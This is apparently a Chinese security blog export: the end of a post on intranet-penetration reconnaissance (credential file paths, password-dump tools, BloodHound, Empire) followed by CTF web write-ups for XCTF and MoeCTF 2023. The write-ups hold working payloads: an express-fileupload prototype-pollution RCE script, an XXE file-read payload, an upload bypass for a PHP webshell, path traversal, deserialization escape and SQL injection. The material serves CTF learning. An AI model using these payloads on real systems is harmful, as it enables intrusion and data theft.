C:\\Windows\\Temp %UserProfile%\\Downloads %UserProfile%\\Recent C:\\$Recycle.bin 常用应用的默认配置路径： Tomcat: CATALINA_HOME/conf/tomcat-users.xml Apache: /etc/httpd/conf/httpd.conf Nginx: /etc/nginx/nginx.conf Wdcp: /www/wdlinux/wdcp/conf/mrpw.conf Mysql: mysql\\data\\mysql\\user.MYD 还有一些Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)的密码查看 项目: https://github.com/uknowsec/SharpDecryptPwd 3.41 BloodHound域分析工具 BloodHound通过图与线的形式，将域内用户、计算机、及相关用户等等之间的关系直观地展现在Red Team队员面前，帮助更快的梳理域内的情况。(这里先做了解) BloodHound基于Neo4j(非关系型数据库) 配置 安装java 安装Neo4jServer Community https://neo4j.com/download-center/#community 开启服务 neo4j.bat console 这里发现有点问题，就先放弃了。留个标记等日后需要拾起- . - 域分析工具BloodHound使用教程 3.42 使用empire收集信息 在攻击机上安装empire后，使用usemodule powershell/situational_awareness/host/winenum即可收集相关信息，注意使用该模块需要拿到管理员权限 四、参考文章： 内网渗透-信息收集篇 内网渗透初识—信息收集1 内网渗透初识—信息收集2","tags":["内网渗透"],"categories":["内网渗透"]},{"title":"攻防世界-BadProgrammer","path":"/2023/09/02/badprogrammer/","content":"题目描述： 我是一个程序员，我什么也不会。 题目解题： 看一下页面，有几个可点击的按钮，不过没什么反应，查看源代码也没发现可疑点。于是用dirsearch扫了一下，发现url/static…/看到了目录 点开几个看了看，发现几个可疑文件 flag.ejs &lt;html&gt; &lt;head&gt; &lt;title&gt;flag?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; No No No, flag is in `flag.txt`. &lt;/body&gt; &lt;/html&gt; app.js const express = require('express'); const fileUpload = require('express-fileupload'); const app = express(); app.use(fileUpload({ parseNested: true })); app.post('/4_pATh_y0u_CaNN07_Gu3ss', (req, res) =&gt; { res.render('flag.ejs'); }); app.get('/', (req, res) =&gt; { res.render('index.ejs'); }) app.listen(3000); app.on('listening', function() { console.log('Express server started on port %s at %s', server.address().port, server.address().address); }); 在app中发现，这是一个express框架，但不知道是是什么漏洞，可能是文件上传，于是借鉴了wp发现了原型链污染 原型链污染漏洞 查看package.json文件，发现引用express-fileupload版本为1.1.7-alpha.4，此版本存在CVE-2020-7699，原型链污染漏洞。 CVE-2020-7699：NodeJS模块代码注入 该漏洞完全是由于Nodejs的express-fileupload模块引起，该模块的1.1.8之前的版本存在原型链污染（Prototype Pollution）漏洞，当然，引发该漏洞，需要一定的配置：parseNested选项设置为true 该漏洞可以引发DOS拒绝服务攻击，配合ejs模板引擎，可以达到RCE的目的 通过污染ejs中outputFunctionName变量，实现RCE： import requests resp1 = requests.post(\"http://{}:{}/{}\".format('61.147.171.105', '62577', '4_pATh_y0u_CaNN07_Gu3ss'), files={'__proto__.outputFunctionName': ( None, \"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x\".format(cmd='cp /flag.txt /app/static/js/flag.txt') )}) print(resp1) 访问，即可得到 flag http://ip/static/js/flag.txt 具体复现就在漏洞库进行了 参考文章： 【愚公系列】2023年06月 攻防世界-Web（BadProgrammer）","categories":["攻防世界"]},{"title":"攻防世界-checkInGame","path":"/2023/09/02/checkingame/","content":"题目描述： checkInGame 题目解题： 打开题目没啥信息，那看一下源码，发现有两个被注释掉的按钮，这里我也不知道如何利用。 随后dirsearch扫了一下网站，没啥结果，这里也就没思路了，于是借鉴wp吧。 看了wp发现是题目环境的问题，我这里显示的都是无权限访问js相关文件，而佬的环境是正常的。但 既然碰到了，咱们就跟着wp走一遍也可。 本题是个js游戏，因为是前端页面，是使用js来实现的，那代码我们可以控制，而且可以调试。 方法一： burpsuite抓包，burpsuite不对包进行处理。然后在浏览器中做游戏，等到40秒过完时，点击确定，页面不会刷新，可以继续做，直到解出flag。 方法二： 访问http://IP:POTRT/，点击F12，查看js代码。 发现view.js初始化函数中有updateTime的属性，猜测是这个属性做了倒计时。 在game.js中调用了这个属性。 下载源码分析调试 ctrl+s下载源码 修改js文件后缀，即删除.下载 修改连连看.html中的js文件后缀，即删除.下载 打开连连看.html,后发现图片没有正常显示，查看元素后，发现图片应该放在连连看.html同目录下img文件中。 再次打开连连看.html，图片加载。 修改game.js文件，注释掉this['updateTime'](); 这段代码，或删除掉这段代码 可以看到倒计时停在40秒。 做完连连看获取flag。 得到flag：flag{98fa8c29-5b70-5f30-36e4-ad006b259686} 参考文章： 【愚公系列】2023年06月 攻防世界-Web（checkInGame） 但这个文章只有一个方法，大家可以参考攻防世界的wp","categories":["攻防世界"]},{"title":"MoeCTF 2023 - 持续更新","path":"/2023/08/30/moectf-2023-wp/","content":"前言 这次是隔了几个星期又来看了看，找了找网上是否有wp，果然有了，对于我这种菜鸡┭┮﹏┭┮还是得考wp度日，因此我们来浅浅复现一波，将web没做出来的做一下。 签到 hello CTFer 这里我是校外用户： https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&amp;input=Ylc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk 将这一段Ylc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk\t进行2次base64解密即可 ![image-20230830095146518](MoeCTF 2023-wp/image-20230830095146518.png) Web http ![image-20230830095314701](MoeCTF 2023-wp/image-20230830095314701.png) 简单的参数设置，get传参?UwU=u，post传Luv=u，修改character=admin，修改xff头为127.0.0.1，修改ua头为MoeBrowser即可 ![image-20230830095702379](MoeCTF 2023-wp/image-20230830095702379.png) ![image-20230830095709297](MoeCTF 2023-wp/image-20230830095709297.png) ![image-20230830095713975](MoeCTF 2023-wp/image-20230830095713975.png) ![image-20230830095718032](MoeCTF 2023-wp/image-20230830095718032.png) Web入门指北 ![image-20230830095841779](MoeCTF 2023-wp/image-20230830095841779.png) 简单解密，做题多了就会认为这是16进制转字符串解密，随后再base64解密即可 ![image-20230830100024678](MoeCTF 2023-wp/image-20230830100024678.png) ![image-20230830100039939](MoeCTF 2023-wp/image-20230830100039939.png) 彼岸的flag ![image-20230830100141555](MoeCTF 2023-wp/image-20230830100141555.png) 翻了翻聊天记录，没啥信息，那就看一下源代码 ![image-20230830100204533](MoeCTF 2023-wp/image-20230830100204533.png) 成功找到flag cookie 先看看附件给了什么 ![image-20230830100606413](MoeCTF 2023-wp/image-20230830100606413-1693361166984-1.png) 这是竟然直接给了如何获取flag，不过肯定没那么简单，我们先试试 ![image-20230830100638898](MoeCTF 2023-wp/image-20230830100638898-1693361199190-3.png) 果然是错的，那我们先注册看看 ![image-20230830100944770](MoeCTF 2023-wp/image-20230830100944770.png) 在登录一下 ![image-20230830101028269](MoeCTF 2023-wp/image-20230830101028269.png) 这里发现出现个token，那难道是垂直越权？不管怎样，先解码一下 ![image-20230830101057502](MoeCTF 2023-wp/image-20230830101057502.png) 那大概率就是修改role为admin去访问flag，这样才满足root权限 那我们去访问flag并且修改token ![image-20230830102741721](MoeCTF 2023-wp/image-20230830102741721.png) ![image-20230830102735480](MoeCTF 2023-wp/image-20230830102735480.png) 得到flag gas!gas!gas! ![image-20230830103144086](MoeCTF 2023-wp/image-20230830103144086.png) 打开页面，没咋看懂，查看源代码也没信息，所以我们随便提交几下，看看页面的信息 ![image-20230830103220275](MoeCTF 2023-wp/image-20230830103220275.png) 说id可能会帮助你定位信息。 这里我一直以为要用脚本的，因为我太菜不会写就没思路了，然后看了wp发现这题脚本似乎真不行，他的回答是： 起初我用了python脚本尝试，但是很遗憾，requests是个同步脚本，我的网络环境达不到0.5秒内给出响应，异步脚本则可能会发送错误的post请求，导致重新开始。 所以这道题可以使用自动化测试脚本来完成，本来想写油猴的脚本，但是也比较麻烦，所以就选择了selenium. 不过，它需要安装扩展和下载驱动：https://googlechromelabs.github.io/chrome-for-testing/#stable 根据自己浏览器版本下载即可。 这里还懵了一会儿，油猴脚本是啥，搜了搜发现是一个开源的集众多大神脚本于一起的插件工具，脚本强大而实用，这里也没深入了解，只是搞了一下那个百度网盘加速的事情。好回归题目，这里也是废了半天时间搞好了他的脚本，想到之前没怎么好好学习脚本，今次开始 得学着写脚本了。脚本如下： import time from selenium import webdriver from selenium.webdriver.chrome.service import Service from selenium.webdriver.common.by import By #以上两行用于控制web浏览器 from lxml import etree #用于解析HTML内容。 s = Service(\"chromedriver.exe\") #使用ChromeDriver（chromedriver.exe）设置Selenium WebDriver driver = webdriver.Chrome(service=s) driver.get('http://localhost:53153/') #启动web浏览器并访问该url,以便后续的交互 input_box = driver.find_element(By.XPATH,'//*[@id=\"driver\"]') #通过xpath语法查找 html中的id=dirver的元素 input_box.send_keys('1')#将文本字符串'1'输入到名为input_box的输入框中。这模拟了在输入框中输入数据的用户操作。 sub = driver.find_element(By.XPATH,'//input[@type=\"submit\"]') sub.submit()#上面两句相互配合，先找到submit提交按钮，然后点击提交 time.sleep(0.2) #设置0.2秒延迟 for index in range(2,10): print(f\"当前飘了 {index} 次\") time.sleep(0.2) #driver.page_source用于获取当前页面的HTML源代码，然后使用etree.HTML和lxml库将其解析为可供脚本进一步处理的结构化数据。 html = etree.HTML(driver.page_source) d = '' try: d = html.xpath('//h3/font/text()')[0] #这里尝试从font子元素的h3元素提取文本，也就是为了获取页面当前车手信息 except:#以下是找flag的语句 flag = html.xpath('//*[@id=\"info\"]/text()[3]')[0] print(flag) time.sleep(10) driver.close() print(\"当前状态:\",d) if \"弯道向左\" in d: driver.find_element(By.XPATH,'//*[@id=\"steering_control\"]/option[3]').click(); print('向右',end='|') elif \"弯道直行\" in d: driver.find_element(By.XPATH, '//*[@id=\"steering_control\"]/option[2]').click(); print('直行',end='|') elif \"弯道向右\" in d: driver.find_element(By.XPATH, '//*[@id=\"steering_control\"]/option[1]').click(); print('向左',end='|') if \"抓地力太小\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[1]').click(); print('松开') elif \"保持这个速度\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[2]').click(); print('保持') elif \"抓地力太大\" in d: driver.find_element(By.XPATH, '//*[@id=\"throttle\"]/option[3]').click(); print('全开') sub = driver.find_element(By.XPATH, '//input[@type=\"submit\"]') sub.submit()#以上则是判断当前车的状况而做出改变 我们首先先看懂代码写的思路，以下是GPT回答 这个Python脚本使用Selenium库自动化与一个运行在本地服务器上的网页（http://localhost:53153/）进行交互。脚本模拟了一种根据从网页中提取的信息来控制方向盘和油门的行为。以下是脚本功能的详细解释： 1. 导入必要的模块： - `time`：用于在脚本中引入延迟。 - `webdriver` 和相关的 `selenium` 组件：用于控制Web浏览器。 - 从 `lxml` 导入的 `etree`：用于解析HTML内容。 2. 使用ChromeDriver（`chromedriver.exe`）设置Selenium WebDriver。 3. 导航到网页 'http://localhost:53153/'。 4. 使用XPath表达式找到网页上的输入框并向其发送值 '1'。 5. 找到并提交网页上的表单。 6. 进入一个循环，从 `2` 到 `9`（包括）的迭代中执行以下操作： - 打印当前迭代次数。 - 引入0.2秒的延迟。 - 使用 `lxml` 解析当前页面的HTML内容。 - 尝试从一个具有 `font` 子元素的 `h3` 元素中提取文本。如果成功，将其赋给变量 `d`。如果失败，捕获异常，打印一条消息，等待10秒后关闭WebDriver并终止脚本。 - 打印从 `d` 中提取的当前状态。 7. 根据 `d` 的值，脚本与网页进行交互： - 如果 `d` 中包含 \"弯道向左\"，则选择向右转的选项。 - 如果 `d` 中包含 \"弯道直行\"，则选择直行的选项。 - 如果 `d` 中包含 \"弯道向右\"，则选择向左转的选项。 - 如果 `d` 中包含 \"抓地力太小\"，则选择释放油门的选项。 - 如果 `d` 中包含 \"保持这个速度\"，则选择保持当前速度的选项。 - 如果 `d` 中包含 \"抓地力太大\"，则选择全速前进的选项。 8. 在根据 `d` 做出必要选择后，再次查找并提交表单。 这个脚本似乎是一个基本的网页自动化示例，用于控制一个模拟车辆的方向盘和油门。脚本定期检查状态并根据需要做出响应。然而，提供的代码中未详细说明被控制的网页的具体功能和行为，脚本可能需要根据实际网页的结构和行为进行调整。此外，确保网页的结构和元素保持一致，以使脚本能够稳定可靠地工作是很重要的。 好，脚本可以看懂了，但我还是不会写啊-.-，这里库的用法就没学，看来有时间得学学库了。 ![image-20230930194220177](MoeCTF 2023-wp/image-20230930194220177.png) 这里需要注意的是要将脚本放到与自己下载的chromedriver同一目录下运行 moe图床 ![image-20230830105737987](MoeCTF 2023-wp/image-20230830105737987.png) 打开是一个文件上传，这里先看一下源代码 ![image-20230830105801041](MoeCTF 2023-wp/image-20230830105801041.png) 发现有个upload.php页面，访问看看，进行代码审计 &lt;?php $targetDir = 'uploads/'; $allowedExtensions = ['png']; if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_FILES['file'])) { $file = $_FILES['file']; $tmp_path = $_FILES['file']['tmp_name']; if ($file['type'] !== 'image/png') { die(json_encode(['success' =&gt; false, 'message' =&gt; '文件类型不符合要求'])); } if (filesize($tmp_path) &gt; 512 * 1024) { die(json_encode(['success' =&gt; false, 'message' =&gt; '文件太大'])); } $fileName = $file['name']; $fileNameParts = explode('.', $fileName); if (count($fileNameParts) &gt;= 2) { $secondSegment = $fileNameParts[1]; if ($secondSegment !== 'png') { die(json_encode(['success' =&gt; false, 'message' =&gt; '文件后缀不符合要求'])); } } else { die(json_encode(['success' =&gt; false, 'message' =&gt; '文件后缀不符合要求'])); } $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']); if (move_uploaded_file($tmp_path, $uploadFilePath)) { die(json_encode(['success' =&gt; true, 'file_path' =&gt; $uploadFilePath])); } else { die(json_encode(['success' =&gt; false, 'message' =&gt; '文件上传失败'])); } } else{ highlight_file(__FILE__); } ?&gt; 这里绕过前端抓包后，修改image类型，文件内存不用管，$secondSegment = $fileNameParts[1];这里如果我们文件是1.php，那么 secondSegment变量为php，因此if($secondSegment !== 'png')想要满足这个，我们可以设置为1.png.php，上传后依然被当做php文件解析，这是Apache解析漏洞 上传后得到路径 ![image-20230830112018057](MoeCTF 2023-wp/image-20230830112018057.png) 我们蚁剑连接即可 ![image-20230830112035967](MoeCTF 2023-wp/image-20230830112035967.png) ![image-20230830112059182](MoeCTF 2023-wp/image-20230830112059182.png) 找到flag 了解你的座驾 ![image-20230830113443403](MoeCTF 2023-wp/image-20230830113443403.png) 查看源码找到一段js代码 &lt;script&gt; function submitForm(name) { var form = document.createElement(\"form\"); form.method = \"post\"; form.action = \"index.php\"; var input = document.createElement(\"input\"); input.type = \"hidden\"; input.name = \"xml_content\"; input.value = \"&lt;xml&gt;&lt;name&gt;\" + name + \"&lt;/name&gt;&lt;/xml&gt;\"; form.appendChild(input); document.body.appendChild(form); form.submit(); } &lt;/script&gt; input.value = “” + name + “”; 在这个代码片段中，将用户提供的 name 参数直接插入到 XML 数据中，没有对其进行任何过滤或转义。这意味着如果用户提供了包含外部实体引用的恶意输入，那么这些实体引用可能会被解析，从而触发 XXE 漏洞。 那我们点击一辆车并bp抓包 payload如下： &lt;!DOCTYPE test [ &lt;!ENTITY poc SYSTEM \"file:///flag\"&gt; ]&gt; &lt;xml&gt;&lt;name&gt;&amp;poc;&lt;/name&gt;&lt;/xml&gt; 记得url编码一下 ![image-20230830114456692](MoeCTF 2023-wp/image-20230830114456692.png) ![image-20230830114449681](MoeCTF 2023-wp/image-20230830114449681-1693367090019-5.png) 得到flag 大海捞针 ![image-20230830114912903](MoeCTF 2023-wp/image-20230830114912903.png) 看到提示那我们抓包爆破一下id看看 ![image-20230830114933322](MoeCTF 2023-wp/image-20230830114933322.png) ![image-20230830115522971](MoeCTF 2023-wp/image-20230830115522971.png) 找到id=341，拿到flag moe图床 ![image-20230930195136880](MoeCTF 2023-wp/image-20230930195136880.png) 当时做这个题以为就是还是单纯的图片绕过上传即可，然后尝试了一下，发现这里是检测上传的文件的 文件头内容是否为其规定的图片开头，这里我直接在前面添加了gif头便成功上传了。 ![image-20230930195923289](MoeCTF 2023-wp/image-20230930195923289.png) 然后就是漫长的蚁剑连接尝试了，但始终未果，然后肯定就是路径的错误嘛，我以为是我不会找上传路径所以放弃了，但是看了wp发现其尝试了路径遍历，这我也是没想到（太菜了┭┮﹏┭┮）那我们借此思路尝试一下 ![image-20230930200537482](MoeCTF 2023-wp/image-20230930200537482.png) 如图访问后，虽然页面没变化（但不知道原因）但我们可以下载看一下，用notepad打开![image-20230930200604713](MoeCTF 2023-wp/image-20230930200604713.png) 成功读取到敏感信息，那意味着这里可以遍历出所有文件信息，这里不重要的就不展示了，手动输入了几次之后成功找到flag，目录在…/…/…/flag，访问下载即可 ![image-20230930201640676](MoeCTF 2023-wp/image-20230930201640676.png) 这里访问提示的php文件，这里访问后简单的PHP特性，数组绕过即可 ![image-20230930201841093](MoeCTF 2023-wp/image-20230930201841093.png) ![image-20230930201939081](MoeCTF 2023-wp/image-20230930201939081.png) 找到flag 夺命十三枪 直接审计代码 &lt;?php highlight_file(__FILE__); require_once('Hanxin.exe.php'); $Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';//判断chant参数是否存在 $new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);//new一个类对象 $before = serialize($new_visitor);//序列化 $after = Deadly_Thirteen_Spears::Make_a_Move($before); echo 'Your Movements: ' . $after . '&lt;br&gt;'; try{ echo unserialize($after);//反序列化 }catch (Exception $e) { echo \"Even Caused A Glitch...\"; } ?&gt; Your Movements: O:34:\"Omg_It_Is_So_Cool_Bring_Me_My_Flag\":2:{s:5:\"Chant\";s:15:\"夺命十三枪\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} Far away from COOL... 那我们就只能看一下Hanxin.exe.php文件 &lt;?php if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) { highlight_file(__FILE__); } class Deadly_Thirteen_Spears{ private static $Top_Secret_Long_Spear_Techniques_Manual = array( \"di_yi_qiang\" =&gt; \"Lovesickness\", \"di_er_qiang\" =&gt; \"Heartbreak\", \"di_san_qiang\" =&gt; \"Blind_Dragon\", \"di_si_qiang\" =&gt; \"Romantic_charm\", \"di_wu_qiang\" =&gt; \"Peerless\", \"di_liu_qiang\" =&gt; \"White_Dragon\", \"di_qi_qiang\" =&gt; \"Penetrating_Gaze\", \"di_ba_qiang\" =&gt; \"Kunpeng\", \"di_jiu_qiang\" =&gt; \"Night_Parade_of_a_Hundred_Ghosts\", \"di_shi_qiang\" =&gt; \"Overlord\", \"di_shi_yi_qiang\" =&gt; \"Letting_Go\", \"di_shi_er_qiang\" =&gt; \"Decisive_Victory\", \"di_shi_san_qiang\" =&gt; \"Unrepentant_Lethality\" ); public static function Make_a_Move($move){ foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement){ $move = str_replace($index, $movement, $move); //这里容易想到字符串逃逸 } return $move; } } class Omg_It_Is_So_Cool_Bring_Me_My_Flag{ public $Chant = ''; public $Spear_Owner = 'Nobody';//这里肯定想要修改为MaoLei function __construct($chant){ $this-&gt;Chant = $chant; $this-&gt;Spear_Owner = 'Nobody'; } function __toString(){ if($this-&gt;Spear_Owner !== 'MaoLei'){//这里给其改一下赋值即可 return 'Far away from COOL...'; } else{ return \"Omg You're So COOOOOL!!! \" . getenv('FLAG'); } } } ?&gt; 很明显就是字符串逃逸了，看一下页面输出的内容 Your Movements: O:34:\"Omg_It_Is_So_Cool_Bring_Me_My_Flag\":2:{s:5:\"Chant\";s:15:\"夺命十三枪\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} 那我们直接在此序列化字符串上修改即可，这里我们是想要Spear_Owner为Maolei，也就是如下\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} 字符串，我们需要将其成功合并到字符串上，那就要将;s:11:\"Spear_Owner\";s:6:\"Nobody\";}给挤出去，故此我们选一个字符串替换后数量增加的，也就是\"di_qi_qiang\" =&gt; \"Penetrating_Gaze\",注意这里\";s:11:\"Spear_Owner\";s:6:\"Nobody\";}为35个，那我们要输入di_qi_qiang七个，那么最后会多出35个将上列字符串挤出去 最终payload为： ?chant=Penetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_Gaze\";s:11:\"Spear_Owner\";s:6:\"Maolei\";} signin 如图随便输入了几个组合，点击login没反应，这时候就得抓包了，不过在此之前，先看一下源代码 ![image-20230930203609332](MoeCTF 2023-wp/image-20230930203609332.png) ![image-20230930203746167](MoeCTF 2023-wp/image-20230930203746167.png) 当初看到上图的第一眼以为是js混淆，然后找了诸多个网站没啥用，然后想到以前的时候遇到过类似的，选择直接控制台run一下，也是报错，之后就没思路放弃了，现在重新看了下，抓包发现了如下 ![image-20230930210225064](MoeCTF 2023-wp/image-20230930210225064.png) 这里params，base64解密5次得到 ![image-20230930210247019](MoeCTF 2023-wp/image-20230930210247019.png) 这里我就大概想的就是越权了，这里再看一下题目给的附件 from secrets import users, salt import hashlib import base64 import json import http.server with open(\"flag.txt\",\"r\") as f: FLAG = f.read().strip() def gethash(*items): #顾名思义为得到hash值，不过这里是自定义的函数，该函数接受任意数量的参数。 c = 0 for item in items: if item is None: continue c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough? return hex(c)[2:] # 确保\"admin\"在用户列表中，并且其密码是\"admin\"，其中users[\"admin\"]代表的就是admin用户的密码，这是users库的用法 assert \"admin\" in users assert users[\"admin\"] == \"admin\" # 对用户列表中的用户名和密码进行哈希处理，得到哈希后的用户列表，其中键是users字典中的键，而值是调用gethash函数计算得到的哈希值。 hashed_users = dict((k,gethash(k,v)) for k,v in users.items()) eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,\"big\",signed=True).decode().translate({ord(c):None for c in \"\\x00\"})) # what is it? def decrypt(data:str): for x in range(5): data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely? //这里提示base64加密了五次 return data __page__ = base64.b64encode(\"PCFET0NUW....\")#这里是访问首页的前端代码，这里就省略了 class MyHandler(http.server.BaseHTTPRequestHandler):#该函数起的作用为对访问者的访问url地址做出反应 def do_GET(self): try: if self.path == \"/\": self.send_response(200) self.end_headers() self.wfile.write(__page__) else: self.send_response(404) #这里看到只有访问/也就是首页才会正常，否则其他都回显404 self.end_headers() self.wfile.write(b\"404 Not Found\") except Exception as e: print(e) self.send_response(500) self.end_headers() self.wfile.write(b\"500 Internal Server Error\") def do_POST(self): try: if self.path == \"/login\": body = self.rfile.read(int(self.headers.get(\"Content-Length\"))) payload = json.loads(body) #设置json数据 params = json.loads(decrypt(payload[\"params\"]))#赋值给params print(params)#以下是对数据中的键值的判断 if params.get(\"username\") == \"admin\": self.send_response(403) self.end_headers() self.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\") print(\"admin\") return if params.get(\"username\") == params.get(\"password\"): self.send_response(403) self.end_headers() self.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\") print(\"same\") return hashed = gethash(params.get(\"username\"),params.get(\"password\")) for k,v in hashed_users.items(): #如果计算出的hash值与预先计算的一致，则输出flag if hashed == v: data = { \"user\":k, \"hash\":hashed, \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\" } self.send_response(200) self.end_headers() self.wfile.write(json.dumps(data).encode()) print(\"success\") return self.send_response(403) self.end_headers() self.wfile.write(b\"Invalid username or password\") else: self.send_response(404) self.end_headers() self.wfile.write(b\"404 Not Found\") except Exception as e: print(e) self.send_response(500) self.end_headers() self.wfile.write(b\"500 Internal Server Error\") if __name__ == \"__main__\": server = http.server.HTTPServer((\"\", 9999), MyHandler) server.serve_forever() ![image-20230930211342269](MoeCTF 2023-wp/image-20230930211342269.png) 这里代码审计审的我有点头疼，因此借鉴一下这位佬的审计思路 在do_POST方法中，代码执行了以下操作： 从HTTP请求中获取包含用户名和密码的JSON数据。 解密JSON数据，然后获取用户名和密码。 使用gethash函数对提供的用户名和密码进行哈希。 将计算出的哈希与预先计算的用户哈希进行比较，以查看是否匹配。 那么，我们可以看到，根据下述代码，用户名和密码均为admin（但这两行代码只是针对users库的检查，并不对用户的输入有何作用） assert \"admin\" in users assert users[\"admin\"] == \"admin\" 也就是只有当hashed的结果为gethash(\"admin\", \"admin\")的时候，才能拿到flag # 计算用户名和密码的哈希值 hashed = gethash(params.get(\"username\"), params.get(\"password\")) # 遍历预先计算的用户哈希值 for k, v in hashed_users.items(): # 如果找到匹配的哈希值，返回用户信息 if hashed == v: data = { \"user\": k, \"hash\": hashed, \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\" } self.send_response(200) self.end_headers() self.wfile.write(json.dumps(data).encode()) print(\"success\") return 到此总结一下思路，也就是我们在前端登陆的时候不能以admin:admin登录，这样会显示无权访问，而看验证代码发现users库中已经含有用户名和密码：admin，admin，并用gethash计算出了各自的hash值存储在hashed_users这一字典中，随后代码要求我们输入的用户名和密码在分别被计算出hash值的时候，与hashed_users字典中存储的某一组数据相等才会回显flag。也就是说只有我们gethash(“admin”，“admin”)的时候才能拿到flag，但很显然我们无法以admin身份登录，那我们只需要关注gethash函数的返回值是否相等即可，那我们测试一下。 import hashlib import base64 import json import http.server salt = 0 def gethash(*items): c = 0 for item in items: if item is None: continue c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough? return hex(c)[2:] print(gethash('admin','admin')) ![image-20231001090719387](MoeCTF 2023-wp/image-20231001090719387.png) 可以看到返回值为0，因此只要我们输入的用户名和密码在gethash作用下返回值为0即可绕过，下面是对 gethash函数的分析（借鉴大佬） 这个函数接受用户名和密码的value作为参数，然后计算它们的哈希值，逻辑如下： 1. 使用hashlib.md5计算项目的MD5哈希值。 2. 将项目包装在方括号中，并与一个名为salt的值连接，然后编码为字节串。 3. 将步骤2中的字节串的MD5哈希值转换为整数。 4. 使用异或运算 (^) 将每个项目的哈希值组合在一起。 5. 将最终的组合哈希值转换为十六进制字符串并返回。 这段代码的安全漏洞，导致可以通过发送{\"username\":null,\"password\":null}来绕过身份验证。 主要问题在于，gethash函数会运行None的输入，它没有检查输入是否为None，而是直接使用它们。 在Python中，将None传递给int(None)会将其转换为0。 所以，如果提供的用户名和密码都为None，gethash函数将计算出相同的哈希值，即0。 假设攻击者发送以下JSON数据： {\"username\": null, \"password\": null} 理论上是可以绕过的，但是代码中有一处规定username不能等于password，于是这位佬构造如下payload（针对代码特性） {\"username\":\"0\", \"password\": 0} 这里利用的是python身为强类型语言，会认为上述用户名和密码不相等从而绕过，如此我们测试一下 ![image-20231001091434902](MoeCTF 2023-wp/image-20231001091434902.png) 发现依旧为0，那显而易见直接post传入上述代码即可，但要base64五次加密 {\"params\":\"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVIaFZWbVJ6VkZaRmQxSnVRbHBOUjFKSVdsY3hUbVZzY0VsWGJYQnBWbXRhZDFaRVNuTlJiVkY1VjJ4S1VWWkVRVGs9\"} ![image-20231001091702139](MoeCTF 2023-wp/image-20231001091702139.png) 拿到flag 出去旅游的心海 ![image-20230831103708841](MoeCTF 2023-wp/image-20230831103708841.png) 打开首页，随便点击了几下没发现东西，那看一下源代码 ![image-20230831103913918](MoeCTF 2023-wp/image-20230831103913918.png) 发现可疑处，这里显示了一个url地址，我们拼接访问一下看看 &lt;?php /* Plugin Name: Visitor auto recorder Description: Automatically record visitor's identification, still in development, do not use in industry environment! Author: KoKoMi Still in development! :) */ // 不许偷看！这些代码我还在调试呢！ highlight_file(__FILE__); // 加载数据库配置，暂时用硬编码绝对路径 require_once('/var/www/html/wordpress/' . 'wp-config.php'); $db_user = DB_USER; // 数据库用户名 $db_password = DB_PASSWORD; // 数据库密码 $db_name = DB_NAME; // 数据库名称 $db_host = DB_HOST; // 数据库主机 // 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下 // 这些是临时的代码 $ip = $_POST['ip']; $user_agent = $_POST['user_agent']; $time = stripslashes($_POST['time']); $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name); // 检查连接是否成功 if ($mysqli-&gt;connect_errno) { echo '数据库连接失败: ' . $mysqli-&gt;connect_error; exit(); } $query = \"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)\"; // 执行插入 $result = mysqli_query($mysqli, $query); // 检查插入是否成功 if ($result) { echo '数据插入成功'; } else { echo '数据插入失败: ' . mysqli_error($mysqli); } // 关闭数据库连接 mysqli_close($mysqli); //gpt真好用 很好，看到了源代码，那我们审一下，这里代码意思是接受三个post传参，随后连接数据库，然后将这几个数据放到数据库进行查询，看是否会返回结果，以此判断是否查询成功，那这里估计就是报错注入了。 那我们先找一下注入点，在我们以此输入ip，ua头以及time时，你会发现你在修改time为恶意sql语句时，页面内容会有所变化，那我们研究一下time就可以了。 研究过程中，我一直以为看闭合方式，判断列数啥的，不过如下图，让我不清楚其执行方式了，然后就放弃了 ![image-20230831104607061](MoeCTF 2023-wp/image-20230831104607061.png) ![image-20230831105022384](MoeCTF 2023-wp/image-20230831105022384.png) 第二天回来又浅试了几下，想着要不别管其他，直接上database()看看，结果真就行了 ![image-20230831105215902](MoeCTF 2023-wp/image-20230831105215902.png) 这让我感觉，在我们输入time内容的时候，似乎只有第一位会被执行，也就是1’ 